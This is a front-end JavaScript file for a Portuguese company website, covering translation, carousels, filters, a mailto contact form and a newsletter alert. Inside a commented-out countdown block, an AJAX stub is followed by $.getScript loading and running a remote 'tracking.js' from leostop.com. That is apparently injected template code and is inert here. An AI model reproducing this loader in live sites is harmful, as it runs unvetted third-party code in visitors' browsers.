/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/
function googleTranslateElementInit() {
  new google.translate.TranslateElement(
    { pageLanguage: "pt", autoDisplay: false },
    "google_translate_element"
  );
}

function changeLanguage(lang) {
  var select = document.querySelector(".goog-te-combo");
  if (select) {
    select.value = lang;
    select.dispatchEvent(new Event("change"));
  }
  setTimeout(removeGoogleTranslateBar, 500);
}

function removeGoogleTranslateBar() {
  var elementsToRemove = [
    ".goog-te-banner-frame",
    ".goog-te-balloon-frame",
    'iframe[style*="visibility: visible"]',
  ];
  elementsToRemove.forEach((selector) => {
    var el = document.querySelector(selector);
    if (el) el.remove();
  });
}

// Remove a barra assim que a página carregar
window.onload = removeGoogleTranslateBar;
$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1000);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  /*
  Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 

  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      var $this = $(this).html(
        event.strftime(
          "" +
            '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> ' +
            '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> ' +
            '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> ' +
            '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> ' +
            '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'
        )
      );
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });*/

  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 3000, // Intervalo ajustado para 3 segundos
    pause: "hover", // Pausa quando o mouse passa por cima (opcional)
  });

  // Apenas dispositivos móveis: Evitar atualizações na navegação por toque
  if (/Mobi|Android/i.test(navigator.userAgent)) {
    $("#blogCarousel").on("touchstart touchmove", function (event) {
      event.stopPropagation(); // Evita a propagação do evento de toque para elementos superiores
      event.preventDefault(); // Previne o comportamento padrão do navegador
    });
  }
});

/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/*Função para filtrar */
document.addEventListener("DOMContentLoaded", function () {
  const filterItems = document.querySelectorAll(".owl-filter-bar .item");
  const categories = document.querySelectorAll(".category");

  filterItems.forEach((item) => {
    item.addEventListener("click", function (event) {
      event.preventDefault();

      document
        .querySelector(".owl-filter-bar .item.active")
        .classList.remove("active");
      this.classList.add("active");

      const filter = this.getAttribute("data-filter");

      categories.forEach((category) => {
        if (filter === "all" || category.classList.contains(filter)) {
          category.style.display = "block";
        } else {
          category.style.display = "none";
        }
      });
    });
  });

  document.querySelector(".owl-filter-bar .item.active").click();
});

/* Carrossel */
const carousels = document.querySelectorAll(".carousel");

function showSlide(carousel, slideIndex) {
  let images = carousel.querySelectorAll("img");
  images.forEach((img) => img.classList.remove("active"));
  images[slideIndex].classList.add("active");
}

function nextSlide(button) {
  let carousel = button.closest(".carousel"); // Encontra o carrossel correto
  let images = carousel.querySelectorAll("img");
  let currentIndex = parseInt(carousel.dataset.index) || 0;
  let newIndex = (currentIndex + 1) % images.length;

  carousel.dataset.index = newIndex;
  showSlide(carousel, newIndex);
}

function prevSlide(button) {
  let carousel = button.closest(".carousel"); // Encontra o carrossel correto
  let images = carousel.querySelectorAll("img");
  let currentIndex = parseInt(carousel.dataset.index) || 0;
  let newIndex = (currentIndex - 1 + images.length) % images.length;

  carousel.dataset.index = newIndex;
  showSlide(carousel, newIndex);
}

/*End of Carrossel*/

/*Voltar pro top*/
window.onscroll = function () {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("backToTop").style.display = "block";
  } else {
    document.getElementById("backToTop").style.display = "none";
  }
};

document.getElementById("backToTop").addEventListener("click", function () {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
});
/*Fim Voltar pro top*/

/* Traduzir a pagina*/

/* Fim Traduzir a pagina*/

/*Enviar email */
function sendEmail(event) {
  event.preventDefault(); // Evita o recarregamento da página

  // Captura os valores do formulário
  var nome = encodeURIComponent(document.getElementById("name").value);
  var empresa = encodeURIComponent(document.getElementById("empresa").value);
  var localidade = encodeURIComponent(
    document.getElementById("localidade").value
  );
  var email = encodeURIComponent(document.getElementById("email").value);
  var tipoContato = encodeURIComponent(
    document.getElementById("contactus").value
  );
  var mensagem = encodeURIComponent(document.getElementById("mensagem").value);

  // Criar o link mailto com os dados formatados corretamente
  var mailtoLink =
    "mailto:comercial@basex-solutions.com" +
    "?subject=Contato via Formulário" +
    "&body=" +
    "Nome: " +
    nome +
    "%0D%0A" +
    "Empresa: " +
    empresa +
    "%0D%0A" +
    "Localidade: " +
    localidade +
    "%0D%0A" +
    "Email: " +
    email +
    "%0D%0A" +
    "Tipo de contato: " +
    tipoContato +
    "%0D%0A" +
    "Mensagem: " +
    mensagem;

  // Abrir o cliente de e-mail do usuário
  window.location.href = mailtoLink;
}

/*Fim do envio de email*/

/*Emitir erro ao subscrever */
function redirecionarParaErro(event) {
  event.preventDefault();
  // Redireciona para a página de erro 404
  window.location.href = "Erro404.html";
}
/*Fim do erro subscrever */

/*Alerta para subscrição*/
document.addEventListener("DOMContentLoaded", function () {
  document
    .getElementById("newslatter_form")
    .addEventListener("submit", function (event) {
      event.preventDefault(); // Evita o envio do formulário

      Swal.fire({
        title: "Subscreveu com sucesso!",
        text: "Agora receberá nossas novidades no seu email.",
        icon: "success",
        confirmButtonText: "Ok",
      });

      // Limpar o campo de email
      document.querySelector("input[name='email']").value = "";
    });
});
